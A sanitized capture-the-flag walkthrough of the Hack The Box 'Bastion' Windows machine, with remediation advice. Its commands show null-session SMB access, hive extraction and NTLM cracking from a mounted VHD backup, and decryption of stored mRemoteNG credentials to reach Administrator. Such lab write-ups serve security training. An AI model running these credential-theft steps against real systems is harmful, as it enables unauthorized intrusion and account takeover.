# HTB — Bastion | Professional Walkthrough

**Difficulty:** Easy  •  **Category:** Enumeration / Credential Access / Privesc  •  **OS:** Windows  •  **Focus:** SMB (VHD backup), SAM extraction, mRemoteNG

> Sanitized: no flags, credentials, or live target details. `<TARGET_IP>` / `<ATTACKER_IP>` replace live values.

## Executive Summary
Bastion exposes an unauthenticated **SMB** share (`Backups`) containing a Windows **VHD** system-image backup. Mounting the VHD gives offline access to the `SAM` and `SYSTEM` registry hives; dumping and cracking the NTLM hash recovers the `l4mpje` user password, used for **SSH**. On the host, **mRemoteNG** stores connection passwords reversibly in `confCons.xml`; decrypting the stored credential yields the local **Administrator** password.

**Risks:** OWASP A05; A02; CWE-306; CWE-312; CWE-522; CWE-257.

## 1. Recon & Port Scanning
```bash
sudo nmap -Pn -sS --min-rate 3000 -p- <TARGET_IP> -oA nmap/full
sudo nmap -Pn -sV -sC -T4 <TARGET_IP> -oA nmap/sv
```
Sanitized result:
```
PORT    STATE SERVICE
22/tcp  open  ssh
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```
SSH and SMB are the relevant services.

## 2. SMB Enumeration (null session)
```bash
smbclient -N -L //<TARGET_IP>/
# Sharename: Backups (Disk)
smbclient -N //<TARGET_IP>/Backups
smb: \> ls
smb: \> cd WindowsImageBackup\<host>\Backup <date>
smb: \> ls
```
The share holds a Windows Image Backup with two `.vhd` files. These are full disk images; downloading the large one is impractical, so mount it instead.

## 3. Credential Access — VHD → SAM/SYSTEM → NTLM
Mount the share, then mount the VHD read-only so only the needed files are read (avoids pulling the whole image):
```bash
# Mount the SMB share locally
sudo mount -t cifs //<TARGET_IP>/Backups /mnt/smb -o username=guest,password=

# Mount the VHD read-only
guestmount --add "/mnt/smb/WindowsImageBackup/<host>/Backup <date>/<disk>.vhd" \
  --inspector --ro /mnt/vhd
```
Copy the registry hives and dump the local hashes:
```bash
cp /mnt/vhd/Windows/System32/config/SAM   .
cp /mnt/vhd/Windows/System32/config/SYSTEM .
samdump2 SYSTEM SAM
```
Sanitized output:
```
l4mpje:1000:aad3b...:<NTLM_REDACTED>:::
```
Crack the NT hash offline:
```bash
hashcat -m 1000 <NTLM_REDACTED> /usr/share/wordlists/rockyou.txt
# → l4mpje : <REDACTED>
```

## 4. Foothold — SSH
```bash
ssh l4mpje@<TARGET_IP>        # password: <REDACTED>
```
User flag: `C:\Users\L4mpje\Desktop\user.txt` (redacted).

## 5. Privilege Escalation — mRemoteNG Reversible Credentials
Enumerate installed software; **mRemoteNG** (a remote-connection manager) is present and stores saved connection passwords in its config:
```cmd
cd C:\Progra~2\mRemoteNG
type Changelog.txt          # confirms an affected version
```
The config is at `%APPDATA%\mRemoteNG\confCons.xml`. Retrieve it and decrypt the stored password. When no custom master password is set, mRemoteNG encrypts with a default/known key, so a public decryptor recovers the plaintext:
```bash
# From the l4mpje SSH session, exfiltrate confCons.xml (e.g. scp)
scp l4mpje@<TARGET_IP>:/Users/L4mpje/AppData/Roaming/mRemoteNG/confCons.xml .

# Decrypt (public mRemoteNG decryptor)
python3 mremoteng_decrypt.py -f confCons.xml
# → Administrator : <REDACTED>
```
Log in as Administrator over SSH:
```bash
ssh administrator@<TARGET_IP>     # password: <REDACTED>
```
Root flag: `C:\Users\Administrator\Desktop\root.txt` (redacted).

## Remediation (summary)
Restrict SMB share access to authenticated, least-privilege users and never expose full system-image backups on readable shares; encrypt backups at rest and store them off-host with access logging. Avoid tools that store credentials reversibly, or set a strong custom master password in mRemoteNG and restrict access to its config; rotate any exposed local Administrator credentials and consider LAPS.

See `FINDINGS.md` for detailed findings, impact and re-test.
